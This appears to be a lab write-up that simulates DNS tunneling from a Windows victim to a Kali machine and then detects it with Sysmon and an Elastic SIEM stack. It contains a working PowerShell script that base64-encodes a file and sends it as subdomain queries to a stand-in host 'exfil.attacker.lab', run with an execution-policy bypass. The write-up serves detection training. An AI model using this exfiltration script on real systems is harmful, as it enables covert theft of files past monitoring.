
# 🛡️ Task 4 – DNS Tunneling: Data Exfiltration via Encoded DNS Subdomain Queries

## 🎯 Objective

Simulate a **DNS tunneling attack** from the victim (Windows) machine to the attacker (Kali) machine. The goal is to exfiltrate encoded data through DNS queries and detect this activity using **Sysmon**, **Winlogbeat**, **Elasticsearch**, **Kibana**, and **ElastAlert**.

---

## 🧪 Lab Setup

| Component          | Machine              |
|-------------------|----------------------|
| Attacker          | Kali Linux           |
| Victim            | Windows 10 Home      |
| Monitoring Tools  | Sysmon, Winlogbeat   |
| SIEM Stack        | Elasticsearch, Kibana, ElastAlert |
| Network Mode      | Bridged              |

---

## ⚙️ Phase 1 – Setup Fake DNS Server on Kali

Install and run `dnschef` to act as a DNS server and capture queries.

```bash
sudo apt update
sudo apt install dnschef -y
sudo dnschef --fakeip 192.168.x.x --interface 192.168.x.x
```

📝 Replace `192.168.x.x` with Kali's IP address.

---

## ⚙️ Phase 2 – Create and Run PowerShell Script on Victim

### 1. Create File to Exfiltrate
```powershell
New-Item -Path "C:\Temp\secret.txt" -ItemType File -Value "This is some secret data to test DNS tunneling"
```

### 2. PowerShell Script (`dns-tunnel.ps1`)

```powershell
$filePath = "C:\Temp\secret.txt"

if (Test-Path $filePath) {
    $data = Get-Content $filePath -Raw
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    $encoded = [Convert]::ToBase64String($bytes)

    $chunks = ($encoded -split '(.{1,50})' | Where-Object { $_ -and $_ -ne "" })

    foreach ($chunk in $chunks) {
        $domain = "$chunk.exfil.attacker.lab"
        Write-Output "Querying: $domain"
        nslookup $domain 192.168.x.x
        Start-Sleep -Milliseconds 500
    }
} else {
    Write-Output "File not found: $filePath"
}
```

### 3. Run the Script
```powershell
powershell -ExecutionPolicy Bypass -File C:\Temp\dns-tunnel.ps1
```

---

## 🔍 Phase 3 – Monitor with Kibana

Use the following query in Kibana **Discover** tab:

```kql
event.code: "1014" and dns.question.name: *.attacker.lab
```

### 🧠 What to Look For
- `dns.question.name` showing base64-encoded subdomains
- `process.name`: `powershell.exe`
- `event.code`: `1014` (Sysmon DNS Query)

---

## 🔔 Sample Log

![alt text](<sample log.png>)

---


## ✅ Outcome

- DNS queries containing encoded data were successfully sent to the attacker.
- Sysmon logged Event ID 1014 with base64-encoded DNS requests.
- Logs were ingested into Elasticsearch via Winlogbeat.
- Kibana visualized suspicious DNS activity.
- ElastAlert rule generated alert on frequent base64 DNS queries.

---

## 📚 References

- MITRE ATT&CK T1071.004 – Application Layer Protocol: DNS
- Sysmon Event ID 1014 – DNS Query
- https://github.com/iphelix/dnschef
